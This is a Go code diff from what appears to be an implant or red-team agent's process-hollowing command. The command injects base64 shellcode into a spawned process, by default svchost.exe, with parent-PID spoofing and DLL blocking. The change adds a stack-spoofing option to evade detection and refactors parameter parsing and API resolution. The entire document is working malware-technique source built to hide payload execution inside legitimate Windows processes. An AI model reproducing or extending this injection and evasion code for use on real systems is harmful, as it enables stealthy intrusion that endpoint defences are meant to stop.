@@ -5,7 +5,6 @@ package commands
 
 import (
 	"encoding/base64"
-	"encoding/json"
 	"fmt"
 	"runtime"
 	"strings"
@@ -27,19 +26,20 @@ type hollowParams struct {
 	Target       string `json:"target"`
 	Ppid         int    `json:"ppid"`
 	BlockDLLs    bool   `json:"block_dlls"`
+	StackSpoof   bool   `json:"stack_spoof"`
 }
 
-// procVirtualProtectExHollow avoids conflict with procVirtualProtectX in helpers
-var procVirtualProtectExHollow = kernel32.NewProc("VirtualProtectEx")
+// procVirtualProtectExHollow — resolved at runtime via ensureInjectionHelpers
+var procVirtualProtectExHollow *syscall.LazyProc
 
 func (c *HollowingCommand) Execute(task structs.Task) structs.CommandResult {
-	if task.Params == "" {
-		return errorResult("Error: parameters required")
+	ensureInjectionHelpers()
+	if procVirtualProtectExHollow == nil {
+		procVirtualProtectExHollow = procVirtualProtectX
 	}
-
-	var params hollowParams
-	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
-		return errorf("Error parsing parameters: %v", err)
+	params, parseErr := unmarshalParams[hollowParams](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	if params.ShellcodeB64 == "" {
@@ -57,6 +57,11 @@ func (c *HollowingCommand) Execute(task structs.Task) structs.CommandResult {
 
 	if params.Target == "" {
 		params.Target = `C:\Windows\System32\svchost.exe`
+	}
+
+	if params.StackSpoof {
+		SetAPISpoofEnabled(true)
+		defer SetAPISpoofEnabled(false)
 	}
 
 	runtime.LockOSThread()
@@ -81,7 +86,7 @@ func performHollowing(shellcode []byte, params hollowParams) (string, error) {
 
 	targetUTF16, err := syscall.UTF16PtrFromString(params.Target)
 	if err != nil {
-		return sb.String(), fmt.Errorf("invalid target path: %v", err)
+		return sb.String(), fmt.Errorf("invalid target path: %w", err)
 	}
 
 	var si syscall.StartupInfo
@@ -119,7 +124,7 @@ func performHollowing(shellcode []byte, params hollowParams) (string, error) {
 				0, uintptr(params.Ppid),
 			)
 			if parentHandle == 0 {
-				return sb.String(), fmt.Errorf("open parent PID %d: %v", params.Ppid, openErr)
+				return sb.String(), fmt.Errorf("open parent PID %d: %w", params.Ppid, openErr)
 			}
 			defer procCloseHandle.Call(parentHandle)
 
@@ -162,7 +167,7 @@ func performHollowing(shellcode []byte, params hollowParams) (string, error) {
 			uintptr(unsafe.Pointer(&pi)),
 		)
 		if ret == 0 {
-			return sb.String(), fmt.Errorf("CreateProcessW failed: %v", lastErr)
+			return sb.String(), fmt.Errorf("CreateProcessW failed: %w", lastErr)
 		}
 	} else {
 		err = syscall.CreateProcess(
@@ -170,7 +175,7 @@ func performHollowing(shellcode []byte, params hollowParams) (string, error) {
 			createFlags, nil, nil, &si, &pi,
 		)
 		if err != nil {
-			return sb.String(), fmt.Errorf("CreateProcess failed: %v", err)
+			return sb.String(), fmt.Errorf("CreateProcess failed: %w", err)
 		}
 	}
 	defer syscall.CloseHandle(pi.Process)
